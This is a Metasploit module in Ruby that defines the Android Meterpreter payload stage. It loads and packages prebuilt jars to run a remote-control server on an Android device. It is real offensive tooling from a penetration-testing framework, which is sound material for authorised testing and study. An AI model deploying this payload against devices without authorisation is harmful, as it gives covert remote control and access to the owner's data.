##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/payload/dalvik'
require 'msf/base/sessions/meterpreter_android'
require 'msf/base/sessions/meterpreter_options'


module Metasploit3
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})
    super(update_info(info,
      'Name'      => 'Android Meterpreter',
      'Description' => 'Run a meterpreter server on Android',
      'Author'    => [
          'mihi', # all the hard work
          'egypt', # msf integration
          'anwarelmakrahy' # android extension
        ],
      'Platform'    => 'android',
      'Arch'      => ARCH_DALVIK,
      'License'   => MSF_LICENSE,
      'Session'   => Msf::Sessions::Meterpreter_Java_Android))

    register_options(
    [
      OptBool.new('AutoLoadAndroid', [true, "Automatically load the Android extension", true])
    ], self.class)
  end

  #
  # Override the Payload::Dalvik version so we can load a prebuilt jar to be
  # used as the final stage
  #
  def generate_stage
    clazz = 'androidpayload.stage.Meterpreter'
    file = File.join(Msf::Config.data_directory, "android", "metstage.jar")
    metstage = File.open(file, "rb") {|f| f.read(f.stat.size) }

    file = File.join(Msf::Config.data_directory, "android", "meterpreter.jar")
    met = File.open(file, "rb") {|f| f.read(f.stat.size) }

    # Name of the class to load from the stage, the actual jar to load
    # it from, and then finally the meterpreter stage
    java_string(clazz) + java_string(metstage) + java_string(met)
  end
end
